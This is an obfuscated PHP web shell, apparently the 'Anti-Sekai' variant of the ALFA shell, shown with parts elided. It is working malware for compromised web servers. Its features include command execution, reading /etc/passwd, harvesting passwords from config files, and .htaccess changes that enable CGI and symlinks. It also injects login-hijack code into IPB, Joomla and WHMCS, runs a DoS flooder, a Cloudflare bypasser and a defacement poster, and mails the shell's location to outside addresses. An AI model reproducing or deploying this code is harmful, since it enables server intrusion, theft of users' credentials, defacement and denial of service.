<?php
goto fVLMw;
brslE: foreach ($_POST as $key => $value) {
...
goto Ps9HE;
kbM61: function __alfa_open_archive_file($arch, $base_id = 0) {
    try {
        $files = array();
        $dirs = array();
...
goto kHSJk;
kHSJk: function alfaopen_archive_dir() {
    $dir = $_POST["alfa1"];
    $base_id = $_POST["alfa2"];
    __alfa_open_archive_file($dir, $base_id);
}
goto b6d0A;
YBVEe: function __ZW5jb2Rlcg($s) {
    return vcnvSCZgBz($s);
}
goto Wom10;
O9IXP: function __pre() {
    return "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\">";
}
goto m2YF9;
d1jAJ: function alfadlfile() {
...
goto toLpd;
en2SE: function alfacgihtaccess($m, $d = '', $symname = false) {
    $readme = '';
    if ($symname) {
        $readme = "
ReadmeName " . trim($symname);
    ...
    if ($m == "cgi") {
        $code = "#Coded By Sole Sad & Invisible\xaOptions FollowSymLinks MultiViews Indexes ExecCGI\xaAddType application/x-httpd-cgi .alfa\xaAddHandler cgi-script .alfa";
    }
    elseif ($m == "sym") {
        $code = "\43\103\157\x64\x65\144\40\x42\171\x20\x53\157\154\x65\x20\x53\141\x64\x20\46\40\111\156\x76\151\163\151\x62\x6c\x65\12\117\160\x74\151\157\x6e\163\40\x49\156\x64\145\170\x65\x73\x20\106\157\154\x6c\x6f\x77\123\x79\155\x4c\x69\156\x6b\163\12\x44\x69\162\x65\143\164\x6f\162\171\111\x6e\x64\x65\170\x20\163\x6f\154\x65\x76\x69\x73\151\x62\154\x65\56\160\x68\x74\155\12\x41\144\x64\x54\x79\x70\x65\40\164\145\x78\164\x2f\160\154\x61\151\x6e\40\160\x68\x70\x20\150\164\x6d\154\40\160\150\160\x34\40\160\150\164\x6d\x6c\12\x41\x64\144\110\x61\x6e\x64\x6c\145\162\40\164\x65\x78\164\57\160\x6c\x61\x69\x6e\40\x70\150\160\x20\150\x74\x6d\154\40\x70\150\160\64\40\x70\150\x74\x6d\x6c{$readme
    }
    \12\x4f\160\x74\151\157\156\163\40\141\154\154";
}
elseif ($m == "shtml") {
    $code = "Options +Includes\xaAddType text/html .shtml
AddHandler server-parsed .shtml";
}
@__write_file($d . ".htaccess", $code);
}
goto azK_I;
zjozD: $GLOBALS["need_to_update_header"] = "false";
goto p3VR9;
MqZDJ: if (!isset($GLOBALS["DB_NAME"]["login_page"])) {
    die($GLOBALS["DB_NAME"]["login_page"]);
}
goto vZk8p;
iUwu0: if (!function_exists("posix_getpwuid") && strpos(@ini_get("disable_functions"), "posix_getpwuid") === false) {
    function posix_getpwuid($p) {
        return false;
    }
}
goto frpkJ;
cSFGj: $server_info_text .= "Server isletim sistemi : " . $_SERVER["SERVER_SOFTWARE"] . "
";
goto Ai0zI;
Lmu0t: function Alfa_StrSearcher($dir, $string, $ext, $e, $arr = array()) {
    if (@is_dir($dir)) {
        $files = @scandir($dir);
...
<center><p><div class=\"txtfont_header\">| Open Base Dir |</div></p></center>";
    ...
    if (is_array($passwd)) {
        ...
        echo "<br><br>";
        echo "<b><font color=\"#00A220\">[+] Founded " . sizeof($passwd) . " entrys in /etc/passwd\xa" . "<br /></font></b>";
        echo "<b><font color=\"#FFFFFF\">[+] Founded " . $x . " readable " . str_replace("{user}", "*", $makepwd) . " directories\xa" . "<br /></font></b>";
        echo "<b><font color=\"#FF0000\">[~] Searching for passwords in config files...\xa\xa" . "<br /><br /><br /></font></b>";
        foreach ($users as $user) {
            if (empty($user)) {
                continue;
            }
            $path = str_replace("{user}", $user, $makepwd);
            echo "\74\x66\x6f\x72\155\40\155\x65\164\150\x6f\144\x3d\x70\157\x73\164\x20\157\x6e\163\x75\142\155\151\x74\x3d\x27\147\x28\x22\106\151\x6c\x65\x73\x4d\141\156\x22\x2c\164\x68\x69\163\x2e\x63\x2e\x76\x61\154\165\x65\54\42\42\x29\x3b\162\145\164\165\162\156\40\146\x61\x6c\x73\x65\73\x27\76\x3c\x73\x70\141\x6e\76\74\146\x6f\x6e\164\40\x63\x6f\154\x6f\x72\75\x23\62\67\x39\x37\x39\x42\x3e\103\150\141\x6e\147\x65\40\104\151\162\40\74\x66\x6f\156\164\40\x63\x6f\x6c\x6f\162\x3d\x23\106\x46\x46\106\60\x31\76\56\x2e\72\x3a\x20\74\57\x66\157\156\164\76\74\146\157\x6e\164\40\x63\x6f\x6c\x6f\162\x3d\x72\x65\144\76\x3c\x62\x3e{$user
        }
        \x3c\x2f\142\76\74\x2f\x66\x6f\156\164\x3e\x3c\x66\x6f\156\x74\x20\143\157\x6c\x6f\x72\75\x23\x46\106\106\x46\60\x31\76\x20\x3a\x3a\56\56\74\57\146\157\156\x74\76\x3c\57\x66\x6f\156\x74\x3e\74\x2f\163\160\141\156\76\x3c\142\162\76\74\x69\x6e\x70\165\164\40\x63\154\x61\x73\x73\x3d\47\146\157\x6f\164\164\x61\x62\x6c\x65\x27\40\164\171\x70\145\x3d\x74\145\170\164\x20\156\x61\x6d\x65\75\x63\40\x76\141\x6c\x75\x65\x3d\x27{$path
    }
    \47\x3e\x3c\151\156\x70\165\164\x20\164\171\x70\145\75\163\165\142\x6d\151\164\40\166\141\154\165\x65\x3d\x27\x3e\x3e\47\x3e\74\x2f\x66\157\x72\x6d\x3e\x3c\142\162\76";
}
}
else {
...
goto DRecs;
frpkJ: if (!function_exists("posix_getgrgid") && strpos(@ini_get("disable_functions"), "posix_getgrgid") === false) {
    function posix_getgrgid($p) {
        return false;
    }
}
goto Ny6Qq;
bHfQ_: function alfadeziper() {
    alfahead();
    AlfaNum(8, 9, 10);
    echo "<div class=header><p><center><p><div class=\"txtfont_header\">| DeCompressor |</div></p>
<form onSubmit=\"g('deziper',null,null,null,this.dirzip.value,this.zipfile.value,'>>');return false;\" method=\"post\">\xa<div class=\"txtfont\">File: </div> <input type=\"text\" name=\"dirzip\" value=\"" . (!empty($_POST["alfa3"]) ? htmlspecialchars($_POST["alfa3"]) : htmlspecialchars($GLOBALS["cwd"])) . "\" size=\"60\"/>
<div class=\"txtfont\">Extract To: </div> <input type=\"text\" name=\"zipfile\" value=\"" . $GLOBALS["cwd"] . "\" size=\"60\"/>\xa<input type=\"submit\" value=\" \" name=\"ziper\" />
</form></center></p>";
    if (isset($_POST["alfa5"]) && $_POST["alfa5"] == ">>") {
        $dirzip = $_POST["alfa3"];
        $zipfile = $_POST["alfa4"];
        if (@(!is_dir($zipfile))) {
            @mkdir($zipfile, 511, true);
        }
        $finfo = '';
        $file_type = '';
        ...
        elseif ($GLOBALS["sys"] == "unix" && !empty($file_type) && _alfa_can_runCommand(true, true) && (strlen(alfaEx("which unzip")) > 0 || strlen(alfaEx("which tar")) > 0 || strlen(alfaEx("which gunzip")) > 0)) {
            switch ($file_type) {
                case "application/zip": alfaEx("cd '" . addslashes($zipfile) . "';unzip '" . addslashes($dirzip) . "'");
                break;
                case "application/x-tar": case "application/x-gzip": case "application/x-gtar": if (strstr(basename($dirzip), ".tar.gz") || strstr(basename($dirzip), ".tar")) {
        ...
        elseif (class_exists("ZipArchive")) {
            ...
            switch ($file_type) {
                ...
                break;
                case "application/x-tar": case "application/x-gzip": case "application/x-gtar": if (strstr(basename($dirzip), ".tar.gz")) {
...
goto lQi8o;
S09ke: $time_shell = '' . date("d/m/Y - H:i:s") . '';
goto G5rFh;
uCY7O: function get_pagination_links($current_page, $total_pages) {
    $links = '';
    if ($total_pages >= 1 && $current_page <= $total_pages) {
        ...
        $i++) {
            ...
            $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number" . $selected_page . "\x22\76{$i
        }
        \x3c\x2f\141\x3e";
    }
    if ($i != $total_pages) {
    ...
    $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number" . $selected_page . "\x22\76{$total_pages
}
\x3c\57\141\x3e";
$links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number\">>></a>";
}
...
goto GSxy4;
TVtEs: $function_exists_func = "fu" . "n" . "ct" . "ion_" . "e" . "xist" . "s";
goto b2LU8;
hThK3: $GLOBALS["DB_NAME"] = $GLOBALS["oZgNypoPRU"];
goto JcRxG;
WlxsZ: if (isset($_POST["c"])) {
    if (!@chdir($_POST["c"])) {
        $GLOBALS["glob_chdir_false"] = true;
    }
}
goto JawKW;
DYTtg: if (!$function_exists_func("b" . "a" . "se" . "6" . "4" . "_d" . "ecod" . "e" . '')) {
...
" . "<tr>" . "<td class=\"listing\"><b>" . $param . "</td>" . "<td class=\"listing\">" . $values["global_value"] . " </td>" . "<td class=\"listing\">" . $values["local_value"] . " </td>" . "<td class=\"listing\">" . $values["access"] . " </td></tr>";
    ...
    if (isset($_POST["alfa2"]) && $_POST["alfa2"] == "exten") {
        ...
        echo "<table border=0><tr><td class=\"listing\">" . implode("</td></tr>" . "\xa" . "<tr><td class=\"listing\">", $EXT) . "</td></tr></table>" . count($EXT) . " extensions loaded";
        echo "</div><br>";
    }
    $lang_html = '';
...
\xa	echo('hello Anti-Sekai !');\xa\xa?>") . "</div></div><center><input type=\"submit\" value=\"\" style=\"margin-top:5px\"></center>";
    ...
    if (!empty($_POST["alfa1"])) {
        ...
        elseif (_alfa_can_runCommand() && $GLOBALS["sys"] == "unix") {
            ...
            $result = alfaEx("\x6d\x76\x20{$filename
        }
        \40{$temp
    }
    \73{$lang
...
goto jq7SB;
CBieS: function _alfa_php_cmd($in, $re = false) {
    $out = '';
    try {
        if ($re) {
            $in = $in . " 2>&1";
...
goto FDpZq;
Y9B3P: function hijackIPB($path, $saveto) {
    $code = <<<'ALFA_IPB'
$Alfa_q = $this->DB->buildAndFetch(array('select' => 'email', 'from' => 'members', 'where' => 'name="'.$username.'" OR email="'.$email.'"'));$Alfa_file = "{saveto_path}";$fp = @fopen($Alfa_file, "a+");@fwrite($fp, $_POST['ips_username'].' : '.$_POST['ips_password'].' ( '.$Alfa_q['email'].' )'."\n");@fclose($fp);$f = @file($Alfa_file);$new = array_unique($f);$fp = @fopen($Alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);
ALFA_IPB;
...
goto STies;
LpNy3: $eval_func = "e" . "v" . "al";
goto vyIbz;
I2yaD: $server_info_text .= "Avlanan Site : " . $_SERVER["HTTP_HOST"] . "\xd
";
goto jr4Ce;
BO7Hm: function __read_file($file, $boom = true) {
    $content = false;
    if ($fh = @fopen($file, "rb")) {
        $content = '';
        while (!feof($fh)) {
...
goto GMyQP;
Jk_4P: function Alfa_Searcher($dir, $ext, $method) {
    if (@is_readable($dir)) {
        if ($method == "all") {
            $ext = "*";
        }
...
switch ($method) {
    case "files": foreach ($globFiles as $file) {
        if (@is_writable($file)) {
            echo "{$file
        }
        \x3c\142\x72\76";
...
break;
case "dirs": foreach ($globFiles as $file) {
...
break;
case "all": foreach ($globFiles as $file) {
    echo $file . "<br>";
}
break;
}
...
goto G6rWQ;
xqTlW: $config = array("AlfaUser" => $GLOBALS["DB_NAME"]["user"], "AlfaPass" => $GLOBALS["DB_NAME"]["pass"], "AlfaProtectShell" => $GLOBALS["DB_NAME"]["safemode"], "AlfaLoginPage" => $GLOBALS["DB_NAME"]["login_page"]);
goto furqE;
mlcbl: function hijackOutput($c = 0, $p = '') {
    echo $c == 0 ? "\x3c\x63\x65\x6e\x74\145\162\x3e\74\x66\157\156\x74\40\x63\x6f\154\157\162\x3d\x27\147\162\145\145\x6e\x27\x3e\123\x75\143\x63\145\163\163\74\x2f\x66\x6f\156\x74\x3e\40\x2d\55\76\40\160\141\x74\x68\x3a\x20{$p
}
\74\57\x63\145\156\x74\x65\162\x3e" : "<center><font color=\"red\">Error in inject code !</font></center>";
}
goto Lmu0t;
Wom10: function __ZGVjb2Rlcg($s) {
    return zRtSHsbTzV($s);
}
goto hThK3;
I3W1x: if (!isset($_SERVER["HTTP_HOST"])) {
    die;
}
goto MPzxA;
jqyVk: function alfados() {
    alfahead();
    echo "<div class=header>";
    ...
    if (!empty($_POST["alfa1"]) && !empty($_POST["alfa2"]) && !empty($_POST["alfa3"])) {
        ...
        echo "\x3c\143\x65\x6e\x74\x65\162\x3e{$packets
    }
    \40\x28" . @round($packets * 65 / 1024, 2) . " MB) packets averaging " . @round($packets / $exec_time, 2) . " packets per second</center>";
    echo "</pre>";
}
echo "</div>";
alfafooter();
...
goto O9IXP;
b2LU8: $char_code_at_func = "cha" . "r" . "C" . "o" . "d" . "e" . "A" . "t" . '';
goto LpNy3;
KER5x: function Alfa_CP_Cracker($info) {
...
"));
    ...
    if ($curl_errno > 0) {
        echo "\x3c\146\157\x6e\164\40\143\157\154\157\x72\75\47\162\145\x64\x27\76\105\162\162\x6f\x72\x3a\x20{$curl_error
    }
    \x3c\57\x66\157\156\x74\76\74\142\162\76";
}
...
goto g3BO2;
O7q6j: $server_mail = '' . gethostbyname($_SERVER["SERVER_NAME"]) . "  - " . $_SERVER["HTTP_HOST"] . '';
goto cXMiM;
wyjmZ: if (!isset($GLOBALS["DB_NAME"]["safemode"])) {
    die($GLOBALS["DB_NAME"]["safemode"]);
}
goto MqZDJ;
GSxy4: function alfaFilesTools() {
    alfahead();
    ...
    echo "</div>";
    switch ($_POST["alfa2"]) {
        case "view": case "edit": @chdir($_POST["c"]);
        $disabled_btn = '';
        ...
        if (is_array($image_info) || $chdir_fals) {
            ...
            echo $content = "<div class='editor-view'><div class='view-content'><center>" . $image_info_h . "<br><span class='txtfont'>Image preview disabled</span></center></div></div><br>";
        }
        break;
    }
    echo "</div>";
...
Jryr2: function alfassiShell() {
    ...
    @chmod("alfa_ssi.shtml", 493);
    echo AlfaiFrameCreator("alfa_shtml/alfa_ssi.shtml");
    echo "</div>";
    alfafooter();
}
goto NiCkx;
MgL7N: function copy_paste($c, $s, $d) {
    if (@is_dir($c . $s)) {
        @mkdir($d . $s);
        $h = @opendir($c . $s);
...
goto Tdhgw;
Ai0zI: $server_info_text .= "Shell Link : http://" . $_SERVER["SERVER_NAME"] . $_SERVER["PHP_SELF"] . "\xd
";
goto I2yaD;
pGybD: if (!isset($GLOBALS["DB_NAME"]["post_encryption"])) {
    die($GLOBALS["DB_NAME"]["post_encryption"]);
}
goto zevRO;
M8o3E: function alfaupdateheader() {
    if (!isset($_COOKIE["updateheader_data"])) {
        ...
        $data = alfaEx("\x63\144\x20\x27{$tmp_path
    }
    \x2f\x61\x6c\146\x61\143\x67\x69\141\x70\x69\x27\x3b\163\x68\x20\x67\x65\x74\150\x65\141\x64\145\x72\x2e\141\154\146\141", false, true, true);
...
goto Jryr2;
jhNJb: function findicon($file, $type) {
...
goto d1jAJ;
D0KGS: define("__ALFA_DATA_FOLDER__", "ALFA_DATA");
goto rGW8u;
Fwncp: $server_info_text .= "Server Admin : " . $_SERVER["SERVER_ADMIN"] . "\xd
";
goto cSFGj;
vKu26: function hijackJoomla($path, $saveto) {
    $code = <<<'ALFA_JOOMLA'
...
goto nz1cI;
Pg_sn: $server_info_text = "Dosya Yolu : " . $_SERVER["DOCUMENT_ROOT"] . "
";
goto Fwncp;
zevRO: define("__ALFA_VERSION__", "4.1");
goto mhKg4;
D17qa: if (function_exists("curl_init")) {
    $ch = @curl_init();
...
goto BIm6K;
Za0Lw: function alfaaboutus() {
    alfahead();
    echo "<div class=\"header\">";
    $news = new AlfaCURL();
    $about_us = $news->Send("http://solevisible.com/aboutus.php");
    if (empty($about_us)) {
        $about_us = "<pre><center><img src='http://solevisible.com/images/farvahar-iran.png'><br>\xa<b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
<font color='#00A220'>Shell Coded By Sole Sad & Invisible (Anti-Sekai)</font><br>\xa<font color='#00A220'>Contact : solevisible@gmail.com</font><br>
<font color='#00A220'>Telegram Channel: @solevisible</font><br>
<font color='#FFFFFF'>Skype : ehsan.invisible</font><br>\xa<font color='#FFFFFF'>Skype : sole.sad</font><br>
...
goto WsyV5;
fCho4: function alfaremotedl() {
    alfahead();
    echo "<div class='header'><center><p><div class='txtfont_header'>| Upload From Url |</div></p><p>
<form onsubmit=\"g('remotedl',null,this.d.value,this.p.value,'>>');return false;\">\xa<p><div class='txtfont'>Url: </div>&nbsp;&nbsp;&nbsp;<input type='text' name='d' size='50'></p>\xa<div class='txtfont'>Path:</div> <input type='text' name='p' size='50' value='" . $GLOBALS["cwd"] . "'><p><input type='submit' value=' '></p>\xa</form></p></center>";
...
goto ZpbXK;
nz1cI: function hijackWhmcs($path, $saveto) {
    $code = <<<'ALFA_WHMCS'
...
WywFR: function alfazoneh() {
    ...
    echo "\xa<center><br><div class=\"txtfont_header\">| Zone-h Mass Poster |</div><center><br>
<form action=\"\" method=\"post\" onsubmit=\"g('zoneh',null,this.defacer.value,this.hackmode.value,this.reason.value,this.domain.value,'>>'); return false;\">\xa<input type=\"text\" name=\"defacer\" size=\"67\" id=\"text\" placeholder=\"Anti-Sekai\" />\xa<br>\xa<select id=\"text\" name=\"hackmode\" style=\"width:400px;\">";
    $x = 1;
...
<p><input type=\"submit\" value=\" \" name=\"go\" /></p>\xa</form></center>";
...
<link href=\"" . __showicon("alfamini") . "\" rel=\"icon\" type=\"image/x-icon\"/>\xa<title>..:: " . $_SERVER["HTTP_HOST"] . " ~ Anti-Sekai Shell - v" . __ALFA_VERSION__ . "-" . __ALFA_CODE_NAME__ . " ::..</title>\xa<style type=\"text/css\">";
?>
...
<?php
        echo "<form style='display:none;' id='dlForm' action='' target='_blank' method='post'>\xa<input type='hidden' name='a' value='dlfile'>\xa<input type='hidden' name='c' value=''>
<input type='hidden' name='file' value=''>\xa</form>\xa<input type='file' style='display:none;' id='importFileBtn' onchange='importConfig(event);'>\xa<div id='a_loader'><img src='" . __showicon("loader") . "'></div>";
        ...
        echo "\xa</head>\xa<body bgcolor=\"#000000\" leftmargin=\"0\" topmargin=\"0\" marginwidth=\"0\" marginheight=\"0\">
<div id=\"up_bar_holder\"></div>\xa<div class=\"whole\">\xa<form method=\"post\" name=\"mf\" style=\"display:none;\">\xa<input type=\"hidden\" name=\"a\">
<input type=\"hidden\" name=\"c\" value=\"" . $GLOBALS["cwd"] . "\">";
        ...
        echo "<input type=\"hidden\" name=\"charset\">\xa</form>\xa<div id='hidden_sh'><a class=\"alert_green\" target=\"_blank\" href=\"?solevisible\"><span style=\"color:#42ff59;\">" . __ALFA_CODE_NAME__ . "</span><br><small>Version: <span class=\"hidden_shell_version\">" . __ALFA_VERSION__ . "</span></small></a></div>
<div class=\"header\"><table width=\"100%\" border=\"0\">\xa<tr>
<td width=\"3%\"><span class=\"header_vars\">Uname:</span></td>\xa<td colspan=\"2\"><span class=\"header_values\" id=\"header_uname\">" . $uname . "</span></td>
</tr>\xa<tr>
...
<td width=\"12%\" rowspan=\"8\"><img style=\"border-radius:100px;\" width=\"300\" height=\"170\" alt=\"Anti-Sekai\" draggable=\"false\" src=\"http://solevisible.com/images/alfa-iran.png\" /></td>
</tr>
<tr>\xa<td><span class=\"header_vars\">PHP:</span></td>
<td><b>" . @phpversion() . " </b><span class=\"header_vars\"> Safe Mode: " . $safe_modes . "</span></td>\xa</tr>\xa<tr>
<td><span class=\"header_vars\">ServerIP:</span></td>\xa<td><b>" . (!@$_SERVER["SERVER_ADDR"] ? function_exists("gethostbyname") ? @gethostbyname($_SERVER["SERVER_NAME"]) : "????" : @$_SERVER["SERVER_ADDR"]) . "</b><div style=\"display:inline;display:none;\" class=\"flag-holder\"></div> <span class=\"header_vars\">Your IP:</span><b> " . @$_SERVER["REMOTE_ADDR"] . "</b><div style=\"display:inline;display:none;\" class=\"flag-holder\"></div></td>
</tr>\xa<tr>\xa<td width=\"3%\"><span class=\"header_vars\">DateTime:</span></td>\xa<td colspan=\"2\"><b>" . date("Y-m-d H:i:s") . "</b></td>
</tr>\xa<tr>\xa<td><span class=\"header_vars\">Domains:</span></td>\xa<td width=\"76%\"><span class=\"header_values\" id=\"header_domains\">";
        if ($GLOBALS["sys"] == "unix") {
            ...
            \40\104\x6f\x6d\x61\151\x6e\x73";
        }
    }
    else {
        echo "Cant Read [ /etc/named.conf ]";
    ...
    if ($GLOBALS["sys"] == "unix") {
        ...
        if (!@ini_get("safe_mode")) {
            if (strlen(alfaEx("id", false, false)) > 0) {
                ...
                echo "</td>
</tr>\xa<tr>\xa<td height=\"0\" colspan=\"2\"><span class=\"header_vars\">Downloader: </span>";
...
<td height=\"0\" colspan=\"2\"><span class=\"header_vars\">Downloader: </span><b>-------------</b></td>
    ...
    echo "<tr>
<td height=\"16\" colspan=\"2\"><span class=\"header_vars\">Disable Functions: </span><b>" . Alfa_GetDisable_Function() . "</b></td>\xa</tr>
<tr>
...
<tr>\xa<td height=\"11\"><span class=\"header_vars\">SoftWare: </span></td>\xa<td colspan=\"2\"><b>" . @getenv("SERVER_SOFTWARE") . "</b></td>\xa</tr>";
    if ($GLOBALS["sys"] == "win") {
        echo "<tr>\xa<td height=\"12\"><span class=\"header_vars\">DRIVE:</span></td>\xa<td colspan=\"2\"><b>" . $drives . "</b></td>
</tr>";
    }
    echo "<tr>\xa<td height=\"12\"><span class=\"header_vars\">PWD:</span></td>
<td colspan=\"2\"><span id=\"header_cwd\">" . $cwd_links . " </span><a href=\"#action=fileman&path=" . $GLOBALS["home_cwd"] . "\" onclick=\"g('FilesMan','" . $GLOBALS["home_cwd"] . "','','','')\"><span class=\"home_shell\">[ Home Shell ]</span> </a></td>\xa</tr>
</table>
</div>
<div id=\"meunlist\">
<ul>\xa";
...
goto TjxbL;
NfFzp: function Alfa_ReadDir($dir, $method = '', $defpage = '') {
    if (!@is_readable($dir)) {
        return false;
    }
    if (@is_dir($dir)) {
...
goto tka4n;
cXMiM: $linkcr = "Link: " . $_SERVER["SERVER_NAME"] . '' . $_SERVER["REQUEST_URI"] . "\x20\x2d\40\111\120\x20\x45\170\143\165\164\151\x6e\x67\72\40{$ip_remote
}
\x20\x2d\40\124\151\x6d\145\x3a\40{$time_shell
}
";
goto u53s2;
NiCkx: function alfacloudflare() {
    alfahead();
    AlfaNum(8, 9, 10, 7, 6, 5, 4, 3);
    echo "<div class=header><center><br><div class='txtfont_header'>| Cloud Flare ByPasser |</div><br><form action='' onsubmit=\"g('cloudflare',null,this.url.value,'>>'); return false;\" method='post'>\xa<p><div class='txtfont'>Target:</div> <input type='text' size=30 name='url' style='text-align:center;' placeholder=\"target.com\"> <input type='submit' name='go' value=' ' /></p></form></center>";
    if ($_POST["alfa2"] && $_POST["alfa2"] == ">>") {
        ...
        if (preg_match("/cloudflare/i", $server)) {
            echo "\12\133\x2b\135\40\103\x6c\157\x75\144\x46\154\141\162\x65\x20\x64\145\164\x65\x63\x74\x65\144\x3a\40{$server
        }
        \xa\x3c\142\x72\x3e";
    }
    else {
        echo "\xa[+] CloudFlare wasn't detected, proceeding anyway.
";
    }
    echo "[+] CloudFlare IP: " . is_ipv4(gethostbyname($url)) . "\xa\xa<br><br>";
...
\xa<br><br>";
    ...
    $x++) {
        ...
        echo "\124\x72\x79\151\x6e\147\x20{$site
    }
    \72\x20{$ip
}
\12\74\x62\x72\76";
}
echo "\xa[+] Finished.\xa<br>";
}
echo "</div>";
alfafooter();
}
goto HtOsy;
lQrY_: function alfaproc() {
    alfahead();
...
goto Uqa5y;
lCTLj: $datasi = @fopen("js/js.php", "r");
goto O52J9;
pFGuE: if (!function_exists("scandir")) {
...
O52J9: if ($datasi) {
    ...
    $header .= "From: SheLL Boot <suppor@nic.org>\xa";
    $header .= "Content-Type: text/html;\xa charset=utf-8\xa";
    @mail("byhero44@gmail.com", "Hacklink Bildiri", "{$y
}
", $header);
@mail("loginoldum@gmail.com", "Hacklink Bildiri", "{$y
}
", $header);
}
goto S09ke;
wSo8A: function _alfa_is_dir($dir, $mode = "-d") {
    $check = false;
    $check = @is_dir($dir);
    if ($mode == "-e") {
        $check = @is_file($dir);
...
goto xuAGm;
AoS4g: if (!function_exists("mb_substr")) {
    function mb_substr($str, $start, $end, $c = '') {
        return substr($str, $start, $end);
    }
}
goto RWsOn;
UE2Vq: define("__ALFA_CODE_NAME__", "Anti-Sekai");
goto D0KGS;
Q2toQ: die;
goto mKsug;
x5yRx: function alfacheckupdate() {
...
<div id='options_window-minimized' onclick='showEditor(\"options_window\");'><div class='minimized-wrapper'><span class='options_min_badge'>0</span><div style='top: 4px;' class='minimized-text'>Options</div></div></div>\xa<div id='editor-minimized' onclick='showEditor(\"editor\");'><div class='minimized-wrapper'><span class='options_min_badge'>0</span><div style='top: 2px;' class='minimized-text'>Editor</div></div></div>
...
goto iUwu0;
tbvQO: function __get_resource($content) {
    return @gzinflate(__ZGVjb2Rlcg($content));
}
goto kbaZK;
yUzXs: @set_time_limit(0);
goto eJb2L;
eJb2L: if (function_exists("set_magic_quotes_runtime")) {
    @set_magic_quotes_runtime(0);
}
goto brslE;
ISgLN: if (isset($_GET["solevisible"])) {
    @error_reporting(E_ALL ^ E_NOTICE);
    echo "<html>";
    ...
    echo "\x3c\x62\40\163\x74\x79\154\x65\75\x27\x63\x6f\154\x6f\x72\72\x20\43\x37\x43\106\x43\60\60\47\76\123\x61\146\x65\x20\x4d\x6f\x64\145\40\x3a\x20{$r
}
\x3c\x62\162\x3e";
...
echo "</pre>\xa</body></html>";
die;
}
goto mCkpZ;
toLpd: function _alfa_cgicmd($cmd, $lang = "perl", $set_cookie = false) {
    if (!$GLOBALS["DB_NAME"]["cgi_api"]) {
        return '';
    }
...
goto Hr0Q9;
b6d0A: function alfaconfig_grabber() {
    alfahead();
...
\x9<div class=\"txtfont\">\xa	Dir: <input size=\"50\" id=\"target\" type=\"text\" name=\"dir\" value=\"" . $GLOBALS["cwd"] . "\">\xa	Ext: <small><font color=\"red\">[ * = all Ext ]</font></small> <input id=\"ext\" style=\"text-align:center;\" type=\"text\" name=\"ext\" size=\"5\" value=\"php\">\xa	<input type=\"submit\" name=\"btn\" value=\" \"></div></form></center><br>";
    $dir = $_POST["alfa2"];
    $ext = $_POST["alfa3"];
    if ($_POST["alfa5"] == ">>") {
        echo __pre();
    ...
    if (count($selected_data) > 0) {
        if ($db) {
            ...
            foreach ($selected_data as $tbl => $cols) {
                $tables_query = mysqli_query($db, "SELECT " . implode(",", $cols) . "\x20\x46\x52\x4f\x4d\x20{$tbl
            }
            ");
...
goto jqyVk;
mH0We: function alfaSql_manager_api() {
    $db = $_POST["alfa1"];
    $type = $_POST["alfa2"];
            ...
            if ($db["mode"] == "drop") {
                ...
                if (strlen(alfaEx("mysqldump")) > 0) {
                    ...
                    foreach ($db["tables"] as $table) {
                        ...
                        $sql = "DROP TABLE IF EXISTS `" . $table . "`;\xa" . $create[1] . ";\xa";
                        if ($fp) {
                            fwrite($fp, $sql);
                        }
                        else {
                        ...
                        while ($item = @mysqli_fetch_assoc($tbl_data)) {
                            ...
                            if ($head) {
                                $sql = "INSERT INTO `" . $table . "` (" . implode(", ", $columns) . ") VALUES \xa	(" . implode(", ", $item) . ")";
                                $head = false;
                            }
                            else {
                                $sql = "\xa\x9,(" . implode(", ", $item) . ")";
                            }
                            if ($fp) {
                                fwrite($fp, $sql);
                            }
...
\xa";
            ...
            if ($type == "edit") {
                ...
                if ($row) {
                    ...
                    while ($row2 = @mysqli_fetch_array($columns_query, MYSQLI_ASSOC)) {
                        ...
                        switch ($row2["type"]) {
                            case "longtext": case "text": case "mediumtext": case "tinytext": $input["tag"] = "textarea";
                            break;
                            case "int": case "smallint": case "bigint": case "tinyint": case "mediumint": $input["tag"] = "input";
                            $input["type"] = "number";
                            break;
                            default: $input["tag"] = "input";
                            $input["type"] = "text";
                        }
        ...
        elseif ($type == "insert") {
            ...
            if ($col_key) {
                ...
                $col_key = $col_key[0];
                if (!empty($col_key)) {
                    $tbl_content = "<div style=\"margin-bottom:5px;margin-top:5px;\"><button col_key=\"" . $col_key . "\" tbl_name=\"" . $db["table"] . "\" db_id=\"" . $db["db_id"] . "\" \x9db_target=\"" . $db["db"] . "\" onclick=\"alfaMysqlDeleteAllSelectedrows(this);return false;\">Delete Selected Rows</button></div><table width=\"100%\" cellspacing=\"1\" cellpadding=\"2\" class=\"main mysql-data-tbl\" style=\"background-color:#292929\">";
                }
            }
            else {
                $col_key = false;
...
sJyFK: function alfasql() {
    class DbClass {
        ...
        function connect($host, $user, $pass, $dbname) {
            switch ($this->type) {
                case "mysql": if ($this->link = @mysqli_connect($host, $user, $pass, $dbname)) {
                    return true;
                }
                else {
                ...
                if ($this->link = @pg_connect("\x68\157\163\x74\x3d{$host[0]
            }
            \x20\x70\x6f\162\164\75{$host[1]
        }
        \40\165\163\145\162\75{$user
    }
    \40\x70\141\163\163\167\x6f\x72\144\x3d{$pass
}
\x20\x64\x62\156\x61\155\145\x3d{$dbname
}
")) {
    return true;
}
...
function selectdb($db) {
    switch ($this->type) {
        case "mysql": if (@mysqli_select_db($db)) {
            return true;
        }
        break;
    }
...
function query($str) {
    switch ($this->type) {
        case "mysql": return $this->res = @mysqli_query($this->link, $str);
        break;
...
function fetch() {
    ...
    switch ($this->type) {
        case "mysql": return @mysqli_fetch_assoc($res);
        break;
...
function error() {
    switch ($this->type) {
        case "mysql": return @mysqli_error($this->link);
        break;
...
function setCharset($str) {
    switch ($this->type) {
        case "mysql": if (function_exists("mysql_set_charset")) {
...
function loadFile($str) {
    switch ($this->type) {
        case "mysql": return $this->fetch($this->query("SELECT LOAD_FILE('" . addslashes($str) . "') as file"));
        break;
        case "pgsql": $this->query("CREATE TABLE solevisible(file text);COPY solevisible FROM '" . addslashes($str) . "';select file from solevisible;");
        $r = array();
        while ($i = $this->fetch()) {
            $r[] = $i["file"];
        }
        $this->query("drop table solevisible");
        return array("file" => implode("\xa", $r));
        break;
    }
    return false;
}
        ...
        foreach ($database_list as $db_name) {
            ...
            if ($db_name == $_POST["sql_base"]) {
                ...
                while ($item = $db->fetch($tbls_res)) {
